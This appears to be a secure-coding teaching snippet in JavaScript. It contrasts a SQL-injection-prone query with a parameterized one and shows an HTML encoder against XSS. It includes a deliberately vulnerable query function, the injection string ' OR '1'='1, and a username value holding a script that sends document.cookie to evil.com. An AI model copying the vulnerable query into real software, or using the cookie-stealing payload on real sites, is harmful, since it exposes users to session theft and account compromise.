// ── 1. SQL Injection: vulnerable vs safe ─────────────────────

// VULNERABLE — never do this:
function getUserVulnerable(db, email) {
  // Input: "' OR '1'='1" bypasses authentication entirely
  const sql = `SELECT * FROM users WHERE email = '${email}'`;
  return db.query(sql); // SQL Injection possible
}

// SAFE — parameterized query:
function getUserSafe(db, email) {
  return db.query('SELECT * FROM users WHERE email = $1', [email]); // pg library
  // The DB driver sends email as data, never as SQL code
}

// ── 2. XSS: output encoding ───────────────────────────────────
function htmlEncode(str) {
  // Minimal safe encoder for HTML text content
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

// VULNERABLE:
const username = '<script>fetch("evil.com?c="+document.cookie)</script>';
